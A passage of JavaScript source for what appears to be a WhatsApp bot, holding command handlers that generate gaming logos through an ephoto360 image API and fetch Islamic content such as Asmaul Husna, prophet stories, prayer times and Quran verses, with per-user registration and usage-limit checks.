let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'gradientlogo':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '3', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '3', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '3', 'zeeone', 'ofc', prefix, command))
const style = ['1','2','3','4','5','6']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'pencilsketch':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'icon', 'panda', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'icon', 'panda', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'icon', 'panda', 'zeeone', 'ofc', prefix, command))
const style = ['bird','butterfly','coffee','dove','leaf','like','lotus','milk-tea','panda','tree','woman','bear','bull','dragon','eagle','hawk','ninja','paw','rooster','sabertooth','skull','warrior','zebra']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Icon')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, icon : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'gunlogogaming':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'm14ebr', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'm14ebr', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'm14ebr', 'zeeone', 'ofc', prefix, command))
const style = ['ak47','ak47-s','an94','ar15','aug','awm','g36k','m4a1','m4-s','m14ebr','m16','m60','m82a1','mp5','scar','svd','xm8','xm1014']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'banneroffreefire':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'misha', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'misha', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'misha', 'zeeone', 'ofc', prefix, command))
const style = ['andrew','caroline','kelly','laura','maxim','miguel','misha','moco','nikita','notora','olivia','steffi']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'letterlogos':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'w', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'w', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'w', 'zeeone', 'ofc', prefix, command))
const style = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','z']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, thumb : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'bannerofoverwatch':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'reinhardt', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'reinhardt', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'reinhardt', 'zeeone', 'ofc', prefix, command))
const style = ['widowmaker','tracer','symmetra','sombra','soldier76','reinhardt','reaper','orisa','mercy','mei','genji','dva','doomfist','ashe','ana']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'bannerofapex':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
const style = ['bg6','bg5','bg4','bg3','bg2','bg1']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'bannerofpubg':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly ??`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'bg3', 'zeeone', 'ofc', prefix, command))
const style = ['bg11','bg10','bg9','bg8','bg7','bg6','bg5','bg4','bg3','bg2','bg1']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'mascotstyle':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly ??`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'dragon-4', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'dragon-4', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.maketeamlogo('teks', 'teks2', 'thumb', 'dragon-4', 'zeeone', 'ofc', prefix, command))
const style = ['dragon-5','jet','knight','skull-3','skull-cyborg','tiger-4','bee-3','dragon-4','fox-3','goat-2','kitsune','octopus-2','piranha','wolf','bear-2','cat','ceberus','crocodile','dinosaur','dragon-3','eagle-3','horse-2','husky','kraken','lynx','sabertooh','assassin','bee','cat2','demon','fox','gorilla','horus','octopus','rounin','scorpion','skull2','tiger3','tiger2','tiger','shark','sabertooth','rooster','rhino','puma','phoenix','panther','owl','lion','horse','hornet','griffin','goat','fox','eagle','dragon2','dragon','devil','cobra','bull','bear','monkey','warrior','rabbit','pirates','owl2','neonwolf','lionking','godzilla','flashwolf','fire','eagle2','dog','mask','team','pubg','drift','bee2']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Thumb')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, thumb : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'logoaccording':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'dragon3', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'dragon3', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.maketeamlogo('teks', 'teks2', 'thumb', 'dragon3', 'zeeone', 'ofc', prefix, command))
const style = ['bear2','cat2','ceberus','crocodile','dinosaur','dragon3','eagle3','horse2','husky','kraken','lynx','sabertooh','assassin','bee','cat','demon','fox-2','gorilla','horus','octopus','rounin','scorpion','-2','tiger-3','bg-tiger','bg-buffalo','chicken','bull','bg-wolf','jaguar','horse','eagle','dragon','wolver','shark','sabertooth','rhino','phoenix','lion','hornet','griffin','bear','tiger2','panther','owl','monkey','goat','fox','dragon2','devil','cobra','reaper','pirates','owl2','mask','fire','eagle2','chamois','neptune','parrots','samurai']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Thumb')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, thumb : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'avataroverwatch':{
		if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text ) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'zenyatta', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'thumb', 'zenyatta', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.maketeamlogo('teks', 'teks2', 'thumb', 'zenyatta', 'zeeone', 'ofc', prefix, command))
const style = ['mccree','mercy','zenyatta','zarya','winston','widowmaker','tracer','torbjorn','symmetra','sombra','soldier76','soldier_76','roadhog','reinhardt','reaper2','reaper','pharah','orisa','mei','lucio','junkrat','hanzo','genji','dva','bastion','ana2','ana','doomfist','bg-1']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Thumb')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, thumb : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break

case 'asmaulhusna':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
var asma = await fetchJson(api('alfa', '/api/islam/'+command, {}, 'apikey'))
	.then(async data =>{
		let txt = '*Asmaul Husna*\n\n'
		txt += `• Latin : ${data.result.latin}\n`
		txt += `• Arabic : ${data.result.arabic}\n`
		txt += `• Tr id : ${data.result.translation_id}\n`
		txt += `• Tr en : ${data.result.translation_en}`
		reply(txt)
		})
		.catch(e =>{
reply(lang.err())
})
db.data.users[m.sender].limit -= 1
}
	break
case 'kisahnabi':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.KisahNabi(prefix, command, 'Adam'))
	var asma = await fetchJson(api('alfa', '/api/islam/'+command, {nabi : q}, 'apikey'))
	.then(async data =>{
		let txt = '*Kisah Nabi*\n\n'
		txt += `• Name : ${data.result.name}\n`
		txt += `• Birth : ${data.result.birth}\n`
		txt += `• Death Age : ${data.result.death_age}\n`
		txt += `• Country : ${data.result.country_from}\n`
		txt += `• Story : ${data.result.story}\n`
		reply(txt)
		})
		.catch(e =>{
reply(lang.err())
})
db.data.users[m.sender].limit -= 1
}
	break
case 'jadwalshalat':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.KisahNabi(prefix, command, 'Makassar'))
	var asma = await fetchJson(api('alfa', '/api/islam/'+command, {daerah : q}, 'apikey'))
	.then(async data =>{
		let txt = '*Jadwal Shalat *\n\n'
		txt += `• Daerah : ${q}\n\n`
		txt += `• Date : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss DD/MM/YYYY')}\n`
		txt += `• Subuh : ${data.result.today.Shubuh}\n`
		txt += `• Zuhur : ${data.result.today.Dzuhur}\n`
		txt += `• Ashr : ${data.result.today.Ashr}\n`
		txt += `• Magrib : ${data.result.today.Maghrib}\n`
		txt += `• Isya : ${data.result.today.Isya}\n`
		reply(txt)
		})
		.catch(e =>{
reply(lang.err())
})
	db.data.users[m.sender].limit -= 1
}
	break
case 'randomquran':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
var asma = await fetchJson(api('alfa', '/api/islam/'+command, {}, 'apikey'))
	.then(async data =>{
		let short = data.result.resources
		let txt = '*Random Quran*\n\n'
		txt += `• Surah : ${short.nameOfSurah.short} (${short.nameOfSurah.transliteration.en})\n`
		txt += `• Surah ke : ${short.numberOfSurah}\n`
		txt += `• Total ayat : ${short.totalAyah}\n`
		txt += `• Ayat ke : ${short.numberOfAyah}\n`
		txt += `• Arab : ${short.ayah.text.arab}\n`
		txt += `• Latin : ${short.ayah.text.transliteration.en}\n`
		txt += `• Tr en : ${short.ayah.translation.en}\n`
		txt += `• Tr id : ${short.ayah.translation.id}\n\n`
		txt += `_*Audio sedang dalam di proses pengiriman*_`
		reply(txt)
		let buff = await getBuffer(short.ayah.audio.primary)
		alpha.sendMessage(from, {audio: {url: short.ayah.audio.primary}, mimetype: 'audio/mpeg'}, {quoted:m})
		})
		.catch(e =>{
reply(lang.err())
})
	db.data.users[m.sender].limit -= 1
}
	break
case 'randomquran2':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.quran2(prefix, commad , 'Juz', '1'))
	var asma = await fetchJson(api('alfa', '/api/islam/'+command, {juz : q}, 'apikey'))
	.then(async data =>{
		let short = data.result.resources
		let txt = '*Random Quran*\n\n'
		txt += `• Surah : ${short.nameOfSurah.short} (${short.nameOfSurah.transliteration.en})\n`
		txt += `• Surah ke : ${short.numberOfSurah}\n`
		txt += `• Total ayat : ${short.totalAyah}\n`
		txt += `• Ayat ke : ${short.numberOfAyah}\n`
		txt += `• Arab : ${short.ayah.text.arab}\n`
		txt += `• Latin : ${short.ayah.text.transliteration.en}\n`
		txt += `• Tr en : ${short.ayah.translation.en}\n`
		txt += `• Tr id : ${short.ayah.translation.id}\n\n`
		txt += `_*Audio sedang dalam di proses pengiriman*_`
		reply(txt)
		alpha.sendMessage(from, {audio: {url: short.ayah.audio.primary}, mimetype: 'audio/mpeg'}, {quoted:m})
		})
		.catch(e =>{
			reply(lang.err())
		})
db.data.users[m.sender].limit -= 1
}
	break
case 'listsurah':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
var asma = await fetchJson(api('alfa', '/api/islam/'+command, {}, 'apikey'))
	.then(async data =>{
